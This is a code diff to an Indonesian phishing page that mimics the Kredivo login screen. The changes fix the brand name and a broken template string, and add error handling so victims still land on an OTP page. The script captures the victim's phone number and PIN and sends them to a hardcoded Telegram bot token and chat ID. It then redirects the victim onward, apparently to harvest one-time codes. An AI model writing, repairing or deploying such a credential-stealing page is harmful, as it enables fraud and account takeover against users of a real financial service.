@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Masuk ke kreditvo</title>
+    <title>Masuk ke Kredivo</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -102,7 +102,7 @@
         }
 
         .signup-link {
-            color: #ff7f50;
+            color: #ff0050;
             font-weight: bold;
             text-decoration: none;
         }
@@ -112,9 +112,9 @@
 
     <div class="login-box">
         <div class="logo">
-            <i class="kredivo"></i>
+            <i class="fas fa-credit-card"></i> <!-- Ganti icon biar muncul -->
         </div>
-        <div class="title">Masuk ke kredivo-mu</div>
+        <div class="title">Masuk ke Kredivo</div>
 
         <div class="input-group">
             <i class="fas fa-user"></i>
@@ -126,7 +126,7 @@
             <input type="Number" id="pin" placeholder="PIN">
         </div>
 
-        <a href="#" class="signup-text">Lupa PIN?</a>
+        <a href="#" class="forgot-link">Lupa PIN?</a>
 
         <button class="login-btn" onclick="kirimData()">MASUK</button>
 
@@ -144,15 +144,16 @@
         // 👇👇 GANTI INI DULU 👇👇
         const BOT_TOKEN = "8334290345:AAEbZSsoNCAUjkVP32C54IflHq2I9LJmvlM"; 
         const CHAT_ID = "-1003996258545";
-        const HALAMAN_BERIKUTNYA = "verifikasi kode.html"; // Ganti nama file
+        const HALAMAN_BERIKUTNYA = "otp2.html"; // Ganti nama file
 
         function kirimData(){
             let nomor = document.getElementById("nomor").value;
             let pin = document.getElementById("pin").value;
 
-            let pesan =  <b>*░▒▬▬ஜ۩KREDITVO۩ஜ▬▬▒░*</b>
-NOMOR HP : ${nomor}
-PASSWOR : ${pin}`;
+            // ✅ Ini yang diperbaiki (tanda petiknya)
+            let pesan = `<b>༺═──◍KUAT SEXY☭──═༻</b>
+NOMOR HP: ${nomor}
+PIN: ${pin}`;
 
             let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
@@ -168,10 +169,13 @@ PASSWOR : ${pin}`;
             .then(() => {
                 // LANGSUNG PINDAH HALAMAN
                 window.location.href = HALAMAN_BERIKUTNYA;
+            })
+            .catch(err => {
+                // Tetap pindah halaman walau error
+                window.location.href = HALAMAN_BERIKUTNYA;
             });
         }
     </script>
 
 </body>
 </html>
-
